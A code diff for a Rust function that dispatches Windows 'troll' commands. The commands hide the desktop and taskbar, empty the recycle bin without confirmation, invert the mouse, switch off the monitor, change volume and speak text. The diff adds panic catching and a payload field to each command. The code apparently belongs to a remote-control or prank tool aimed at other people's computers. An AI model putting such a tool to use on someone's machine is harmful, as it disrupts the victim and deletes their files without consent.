@@ -28,24 +28,30 @@ use winapi::um::shellapi::{SHEmptyRecycleBinW, SHERB_NOCONFIRMATION, SHERB_NOPRO
 use std::ptr;
 
 pub fn execute_troll_command(command: &TrollCommand) {
-    match command {
-        TrollCommand::HideDesktop => toggle_desktop(false),
-        TrollCommand::ShowDesktop => toggle_desktop(true),
-        TrollCommand::HideTaskbar => toggle_taskbar(false),
-        TrollCommand::ShowTaskbar => toggle_taskbar(true),
-        TrollCommand::HideNotify => toggle_notification_area(false),
-        TrollCommand::ShowNotify => toggle_notification_area(true),
-        TrollCommand::FocusDesktop => focus_desktop(),
-        TrollCommand::EmptyTrash => empty_recycle_bin(),
-        TrollCommand::RevertMouse => toggle_invert_mouse(true),
-        TrollCommand::NormalMouse => toggle_invert_mouse(false),
-        TrollCommand::MonitorOff => toggle_monitor(false),
-        TrollCommand::MonitorOn => toggle_monitor(true),
-        TrollCommand::MaxVolume => max_volume(),
-        TrollCommand::MinVolume => min_volume(),
-        TrollCommand::MuteVolume => mute_volume(),
-        TrollCommand::UnmuteVolume => unmute_volume(),
-        TrollCommand::SpeakText(ref text) => speak_text(text),
+    let result = std::panic::catch_unwind(|| {
+        match command {
+            TrollCommand::HideDesktop(_p) => toggle_desktop(false),
+            TrollCommand::ShowDesktop(_p) => toggle_desktop(true),
+            TrollCommand::HideTaskbar(_p) => toggle_taskbar(false),
+            TrollCommand::ShowTaskbar(_p) => toggle_taskbar(true),
+            TrollCommand::HideNotify(_p) => toggle_notification_area(false),
+            TrollCommand::ShowNotify(_p) => toggle_notification_area(true),
+            TrollCommand::FocusDesktop(_p) => focus_desktop(),
+            TrollCommand::EmptyTrash(_p) => empty_recycle_bin(),
+            TrollCommand::RevertMouse(_p) => toggle_invert_mouse(true),
+            TrollCommand::NormalMouse(_p) => toggle_invert_mouse(false),
+            TrollCommand::MonitorOff(_p) => toggle_monitor(false),
+            TrollCommand::MonitorOn(_p) => toggle_monitor(true),
+            TrollCommand::MaxVolume(_p) => max_volume(),
+            TrollCommand::MinVolume(_p) => min_volume(),
+            TrollCommand::MuteVolume(_p) => mute_volume(),
+            TrollCommand::UnmuteVolume(_p) => unmute_volume(),
+            TrollCommand::SpeakText(text) => speak_text(text),
+        }
+    });
+
+    if let Err(err) = result {
+        println!("Panic in troll command: {:?}", err);
     }
 }
 
